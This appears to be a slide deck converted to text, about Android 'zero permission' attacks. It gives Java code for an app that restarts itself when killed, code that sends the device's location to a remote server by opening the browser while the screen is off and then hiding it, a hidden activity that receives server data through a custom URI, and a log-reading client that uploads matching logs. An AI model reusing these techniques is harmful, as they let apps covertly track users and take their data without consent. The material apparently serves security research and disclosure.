### Malicious Activity
```java
protected void onDestroy() {
    super.onDestroy();
    startService(new Intent(getApplicationContext(), RestartService.class));
}
```

### Circle of Death with Zero Permissions
- **To Remove:**
  - Boot into safe mode (no non-system apps can run) and uninstall the malicious application.
  - **Bonus Points:** Maximize volume and play an obnoxious sound.

- **Apps or Games Not Requesting INTERNET:**
  - These seem low risk.
  - Your sandbox cannot access the internet.
  - Ask your neighbor or open a browser.

### NetHack
```java
startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("http://mysite.com/data?lat=" + lat + "&lon=" + lon)));
```

### Upload with Zero Permissions
- **Can We Do This Secretly?**
  - Obscuring the browser (using `onPause()`) stops the page from loading.
  - Example log:
    ```
    32.175.xxx.xxx - - [03:30:36] "GET /data?lat=123.2&lon=32.2 HTTP/1.1" 404 203
    ```

- **Pop Up Browsers When Screen is Off:**
  - Need to close the browser when the screen turns on.
  - **Bonus Points:** Redirect to `http://www.google.com` when done (or read browser history from logs).

```java
PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
if (!pm.isScreenOn()) {
    Log.e("NetHack", "Screen off");
    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("http://mysite/data?lat=" + lat + "&lon=" + lon)).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
    mBrowserDisplayed = true;
} else if (mBrowserDisplayed) {
    Log.e("NetHack", "Screen on");
    startActivity(new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME));
    mBrowserDisplayed = false;
}
```

### Two-Way Communication

### Internet with Zero Permissions
- **Pop Browser to Page with Downloadable Content-Type:**
  - Default Android browser automatically saves it to `/sdcard/downloads/data.zip`.
  - **Downsides:**
    - No way to clear notifications.
    - To clean up the filesystem, you need `WRITE_EXTERNAL_STORAGE`.
    - Automatically requested if targeting Android 1.5.

- **Custom URI Receiver:**
  - Google Maps uses `geo:latitude,longitude?zoom` to launch their app.
  - We can do the same with `nethack://`.

- **Register for `nethack://`:**
  - Redirect our page to `nethack:data?param=server_data`.
  - This is meant for foreground interactions.

- **Activity Never Seen:**
  - Call `finish()` in `onCreate()` so no one sees the activity.
  - Data is available in the `Intent`.
  - **Bonus Points:** New tab for `nethack` URI and redirect original page to `http://google.com`.

```java
public class NetHackReceiver extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e("NetHack", "URI: " + getIntent().toURI());
        finish(); // So no one ever sees this activity
    }
}
```

### Application Logging
```java
import android.util.Log;

public class MyClass {
    private static final String TAG = "MyLogTag";

    public void someMethod() {
        Log.d(TAG, "Some log content goes here");
    }
}
```

### Log Devices
- **Main:** `/dev/log/main`
- **Events:** `/dev/log/events`
- **Radio:** `/dev/log/radio`
- **System:** `/dev/log/system`

### /dev/log/events
- **Note:** This is not the main "logcat" debugging log. These diagnostic events are for system integrators, not application authors.

### /dev/log/radio
- **Radio Command Stream and Debug Data:**
  ```log
  D/CDMA (182): [CdmaDataConnection] DataConnection.clearSettings()
  D/CDMA (182): [DataConnection] Stop poll NetStat
  D/CDMA (182): [CdmaDataConnectionTracker] setState: IDLE
  ...
  ```

### /dev/log/main
- **Example Logs:**
  ```log
  I/wpa_supplicant(1483): CTRL-EVENT-SCAN-RESULTS Ready
  I/wpa_supplicant(1483): wpa_disabled_ssid_list_clear
  E/wpa_supplicant(1483): wpa_supplicant_ctrl_iface_ap_scan: 1
  V/WiFiMonitor(89): Event [wpa_disabled_ssid_list_clear]
  ...
  ```

### Logcat
- **Example Output:**
  ```log
  $ adb logcat
  D/dalvikvm(189): GC freed 480 objects / 22376 bytes in 70ms
  D/HtcLockScreen(85): onRefreshBatteryInfo: 15
  I/global(85): Default buffer size used in BufferedReader constructor. It would be better to be explicit if an 8k-char buffer is required.
  ...
  ```

### Permissions
- **Ability to Read Logs:**
  - Gated by `android.permission.READ_LOGS`.
  - `shell` is granted this permission for `adb` debugging.
  - `READ_LOGS` is an alias for `READ*`.

```java
public static final String READ_LOGS = "android.permission.READ_LOGS";
```

### The Client
- **Android Service that Requests:**
  - `android.permission.READ_LOGS`
  - `android.permission.INTERNET`
  - Downloads policies from the server.
  - Periodically delivers logs matching regex.

### LogcatDevice
```java
public class LogcatDevice extends LogSource {
    public void open() throws IOException {
        StringBuilder command = new StringBuilder("logcat");
        File devFile = new File(DEVLOG + buffer);
        if (devFile.exists()) {
            // Further implementation
        }
    }
}
```